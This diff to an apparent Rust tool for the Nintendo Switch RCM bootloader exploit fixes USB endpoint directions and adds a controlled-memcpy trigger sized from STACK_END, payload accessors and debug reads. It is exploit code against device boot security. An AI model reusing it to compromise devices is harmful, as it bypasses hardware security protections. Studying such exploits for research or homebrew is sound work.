@@ -16,16 +16,21 @@ impl Switch {
     }
 
     pub fn with_vid_and_pid(vid: u16, pid: u16) -> Option<Self> {
-        let device = rusb::open_device_with_vid_pid(vid, pid)?;
+        let mut device = rusb::open_device_with_vid_pid(vid, pid)?;
+        device.claim_interface(0).unwrap();
         Some(Self { device })
     }
 
-    fn read(&self, buf: &mut [u8]) -> rusb::Result<usize> {
+    pub fn read(&self, buf: &mut [u8]) -> rusb::Result<usize> {
+        let a = self
+            .device
+            .read_manufacturer_string_ascii(&self.device.device().device_descriptor()?)?;
+        dbg!(a);
         self.device.read_bulk(0x81, buf, Duration::from_secs(1))
     }
 
     fn write_buffer(&self, buf: &[u8]) -> rusb::Result<usize> {
-        self.device.write_bulk(0x81, buf, Duration::from_secs(1))
+        self.device.write_bulk(0x01, buf, Duration::from_secs(1))
     }
 }
 
@@ -45,14 +50,14 @@ impl Vulnerability for Switch {
         const GET_STATUS: u8 = 0x0;
         const STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT: u8 = 0x82;
 
-        let buf = vec![0u8; length];
+        let mut buf = vec![0u8; length];
 
-        self.device.write_control(
+        self.device.read_control(
             STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,
             GET_STATUS,
             0,
             0,
-            &buf,
+            &mut buf,
             Duration::from_secs(1),
         )
     }
@@ -156,6 +161,10 @@ impl Payload {
         assert!(data.len() <= MAX_LENGTH as usize);
         Self { data }
     }
+
+    pub fn data(&self) -> &[u8] {
+        &self.data
+    }
 }
 
 impl Rcm {
@@ -170,7 +179,7 @@ impl Rcm {
     }
 
     /// Writes data to the RCM protocol endpoint
-    pub fn write(&mut self, buf: &mut [u8]) -> rusb::Result<usize> {
+    pub fn write(&mut self, buf: &[u8]) -> rusb::Result<usize> {
         const PACKET_SIZE: usize = 0x1000;
         const MAX_LENGTH: usize = 0x30298;
 
@@ -196,20 +205,25 @@ impl Rcm {
         Ok(written)
     }
 
-    fn current_buff_addr(&self) -> usize {
+    pub fn current_buff_addr(&self) -> usize {
         self.current_buffer.address()
     }
 
-    fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
+    pub fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
         if self.current_buffer != BufferState::High {
-            let buf = &mut [0u8; 0x1000];
+            let buf = &[b'\0'; 0x1000];
             self.write(buf)?;
         }
         Ok(())
     }
 
-    pub fn trigger_controlled_memcopy(&self, len: usize) -> rusb::Result<usize> {
-        self.switch.trigger(len)
+    pub fn trigger_controlled_memcopy(&self) -> rusb::Result<usize> {
+        let length = STACK_END - self.current_buff_addr();
+        self.trigger_controlled_memcopy_length(length)
+    }
+
+    pub fn trigger_controlled_memcopy_length(&self, length: usize) -> rusb::Result<usize> {
+        self.switch.trigger(length)
     }
 
     fn write_buffer(&mut self, buf: &[u8]) -> rusb::Result<usize> {
@@ -223,5 +237,11 @@ impl Rcm {
 
     fn read(&mut self, buf: &mut [u8]) -> rusb::Result<usize> {
         self.switch.read(buf)
+    }
+
+    pub fn read_device_id(&mut self) {
+        let mut buf = [b'\0'; 16];
+        self.read(&mut buf).unwrap();
+        dbg!(buf);
     }
 }
